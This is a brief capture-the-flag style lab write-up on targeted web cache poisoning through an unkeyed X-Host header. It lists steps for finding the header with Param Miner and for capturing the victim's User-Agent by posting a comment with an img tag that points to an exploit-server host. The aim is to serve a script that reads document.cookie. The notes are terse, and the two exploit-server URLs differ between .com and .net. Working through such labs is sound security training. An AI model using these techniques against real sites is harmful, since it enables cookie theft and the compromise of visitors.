# **Targeted web cache poisoning using an unknown header**

Task: This lab is vulnerable to web cache poisoning. A victim user will view any comments that you post. To solve this lab, you need to poison the cache with a response that executes `alert(document.cookie)` in the visitor's browser. However, you also need to make sure that the response is served to the specific subset of users to which the intended victim belongs. 

Toolkit: Browser, Burpsuite

1. use param miner and see x-host as unkeyed header  
2. it reflects in resp

script type="text/javascript" src="//[exploit-0a7c0017030007dd802a0c710169009a.exploit-server.com/resources/js/tracking.js](http://exploit-0a7c0017030007dd802a0c710169009a.exploit-server.com/resources/js/tracking.js)"\>\</script\>

3. than we see that user-agent is a part of the key

Content-Type: text/html; charset=utf-8  
Vary: User-Agent  
X-Frame-Options: SAMEORIGIN  
Cache-Control: max-age=30  
Age: 0

we must define user agent of the victim

4. post a comment

\<img src="https://exploit-0a7c0017030007dd802a0c710169009a.exploit-server.net/resources/js/tracking.js" /\>
